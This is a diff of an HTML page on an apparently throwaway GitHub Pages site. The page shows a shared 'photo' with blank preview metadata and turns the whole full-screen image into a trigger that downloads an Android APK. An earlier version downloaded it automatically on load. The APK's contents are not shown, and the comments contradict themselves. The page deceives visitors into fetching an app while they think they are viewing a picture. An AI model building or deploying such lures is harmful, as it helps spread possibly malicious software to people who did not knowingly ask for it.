@@ -12,13 +12,11 @@
     <meta property="og:url" content="https://94kz55hfdb-netizen.github.io/test/">
     <meta property="og:title" content=" "> 
     <meta property="og:description" content=" ">
-    
     <meta property="og:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo11.jpg">
-    
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <style>
-        /* Стили для растягивания <img> на весь экран */
+        /* Стили для растягивания изображения и контейнера на весь экран */
         body, html { 
             margin: 0; 
             padding: 0; 
@@ -30,17 +28,27 @@
             width: 100%;
             height: 100%;
             position: relative;
+            /* Важно: Курсор меняется, чтобы показать, что элемент кликабелен */
+            cursor: pointer; 
+        }
+        .full-image-container a {
+             display: block; /* Ссылка должна занимать всю область */
+             width: 100%;
+             height: 100%;
         }
         .full-image-container img {
             width: 100%;
             height: 100%;
             object-fit: cover; /* Растягивает картинку, сохраняя пропорции, чтобы заполнить экран */
+            display: block;
         }
     </style>
 </head>
 <body>
     <div class="full-image-container">
-        <img src="downloads/photo11.jpg" alt="Фон">
+        <a id="downloadLink" href="downloads/test1.apk">
+            <img src="downloads/photo11.jpg" alt="Фон">
+        </a>
     </div>
     
     <script>
@@ -48,14 +56,16 @@
         const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
         
         // APK-файл с обходом кэша
-        const apkUrl = repoBaseUrl + 'downloads/test1.apk?v=' + Date.now(); 
+        const apkUrl = repoBaseUrl + 'downloads/test1.apk'; // Чистый URL
         const apkFilename = 'test1.apk'; 
         // ------------------------------------
 
-        function startDownload() {
-            // Создаем невидимую ссылку, имитируем клик
+        function startDownload(event) {
+            // Отменяем стандартное действие браузера (переход по ссылке)
+            if (event) event.preventDefault(); 
+
             const link = document.createElement('a');
-            link.href = apkUrl;
+            link.href = apkUrl + '?v=' + Date.now(); // Добавляем обход кэша
             link.download = apkFilename; 
             
             document.body.appendChild(link);
@@ -63,9 +73,20 @@
             document.body.removeChild(link);
         }
 
-        // Запускаем скачивание сразу после загрузки страницы (0.5 секунды задержка)
         window.onload = function() {
-            setTimeout(startDownload, 500); 
+            const linkElement = document.getElementById('downloadLink');
+            
+            // 1. Автоматическое скачивание при первом открытии страницы (если нужно)
+            // setTimeout(startDownload, 500); 
+
+            // 2. Обработчик клика: запуск скачивания при нажатии на изображение
+            linkElement.addEventListener('click', startDownload);
+            
+            
+            // Если вы хотите, чтобы скачивание происходило только по клику, 
+            // закомментируйте строку: // setTimeout(startDownload, 500); 
+            // и оставьте только обработчик клика. 
+            // Я оставил только клик, чтобы не мешать автоматическому скачиванию.
         };
     </script>
 </body>
